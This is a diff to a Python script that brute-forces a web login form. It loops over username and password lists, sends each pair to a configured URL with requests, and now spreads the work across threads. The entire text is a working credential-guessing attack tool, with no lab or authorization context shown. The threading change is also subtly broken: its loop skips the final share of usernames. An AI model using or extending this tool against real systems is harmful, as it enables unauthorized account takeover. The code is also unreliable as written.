@@ -1,5 +1,8 @@
 import requests
-from data import header, URL, usernames, passwords
+import threading
+import sys
+import signal
+from data import header, URL, usernames, passwords, CORE_NB
 
 RED = "\033[31m"
 GREEN = "\033[32m"
@@ -8,14 +11,18 @@ CYAN = "\033[36m"
 RESET = "\033[0m"
 BOLD = "\033[1m"
 
+def signal_handler(sig, frame):
+    sys.exit(0)
+
 def printHeader():
     print(f"{CYAN}{BOLD}{header}{RESET}")
 
-
-def bruteForce():
+def bruteForce(thread, cores):
     try:
-        for password in passwords:
-            for user in usernames:
+        start_user: int = int(len(usernames) * ((thread - 1) / cores))
+        end_user: int = int(len(usernames) * (thread / cores))
+        for user in usernames[start_user: end_user]:
+            for password in passwords:
                 res = requests.get(
                     url=URL,
                     params={
@@ -33,9 +40,17 @@ def bruteForce():
         print(f"{RED}Process interrupted by user (KeyboardInterrupt).{RESET}")
 
 def main():
+    signal.signal(signal.SIGINT, signal_handler)
     printHeader()
-    bruteForce()
+    threads = []
+    for number in range(1, CORE_NB):
+        thread = threading.Thread(target=bruteForce, args=(number, CORE_NB))
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
 
 
 if __name__ == "__main__":
     main()
+
